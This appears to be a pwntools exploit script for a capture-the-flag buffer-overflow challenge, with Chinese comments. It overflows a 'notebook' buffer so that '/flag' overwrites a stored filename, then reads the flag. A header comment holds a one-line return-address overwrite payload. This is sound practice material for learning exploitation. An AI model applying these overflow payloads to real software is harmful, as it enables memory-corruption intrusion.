# 简单标准重定向：python -c "print('A' * 48 + '\xc0\x12\x40\x00\x00\x00\x00\x00')" | ./buffer-overflow-level4.0

from pwn import *

binary_path = "/challenge/buffer-overflow-level2.0"

# 启动进程
p = process(binary_path)

# 接收并打印初始输出
initial_output = p.recvuntil(b"We have a magic notebook for you:")
print("[*] Initial Output:")
print(initial_output.decode())

def create_notebook():
    p.sendline(b"1")
    output = p.recvuntil(b"Input your notebook content:")
    print("[*] Output after selecting create notebook:")
    print(output.decode())
    # 填充 notebook 内容
    p.sendline(b"A" * 32)
    output = p.recvuntil(b"Done!")
    print("[*] Output after creating notebook:")
    print(output.decode())

def edit_notebook():
    p.sendline(b"2")
    output = p.recvuntil(b"Input your notebook size:")
    print("[*] Output after selecting edit notebook:")
    print(output.decode())
    # 设置 size 为 48（0x30）
    p.sendline(b"48")
    payload = b"A" * 0x20 + b"/flag" + b"\x00" * (0x10 - len("/flag"))
    output = p.recvuntil(b"Input your notebook content:")
    print("[*] Output before sending payload:")
    print(output.decode())
    p.sendline(payload)
    output = p.recvuntil(b"Done!")
    print("[*] Output after editing notebook:")
    print(output.decode())

def read_notebook():
    p.sendline(b"666")
    print("[*] Attempting to read notebook...")

# 创建 notebook
create_notebook()

# 编辑 notebook 并覆盖 filename
edit_notebook()

# 读取 /flag 内容
read_notebook()

# 打印所有剩余输出
final_output = p.recvall()
print("[*] Final Output:")
print(final_output.decode())
